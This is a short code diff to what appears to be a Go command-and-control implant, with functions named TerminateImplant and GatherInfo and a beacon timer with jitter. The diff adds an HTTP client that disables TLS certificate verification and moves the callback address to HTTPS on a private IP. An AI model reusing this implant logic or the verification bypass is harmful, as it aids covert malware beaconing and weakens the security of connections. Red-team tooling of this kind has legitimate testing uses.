@@ -3,11 +3,13 @@ package main
 import (
 	"bytes"
 	"compress/gzip"
+	"crypto/tls"
 	"encoding/base64"
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"io"
+	"net/http"
 	"os"
 	"strconv"
 	"strings"
@@ -15,6 +17,14 @@ import (
 )
 
 var callbackTimer = CallbackInfo{Callback_freq: 1, Jitter: 15, SelfTerminate: 20}
+
+var customClient = &http.Client{
+	Transport: &http.Transport{
+		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
+		DisableKeepAlives: true,
+	},
+	Timeout: 10 * time.Second,
+}
 
 type ResultsCreate struct {
 	TaskingID float64 `json:"tasking_id"`
@@ -216,7 +226,7 @@ func TerminateImplant() {
 func main() {
 
 	retryCounter := 0
-	serverUrl := "http://192.168.15.172:8000"
+	serverUrl := "https://192.168.15.172:8000"
 
 	initialInfo := GatherInfo()
 
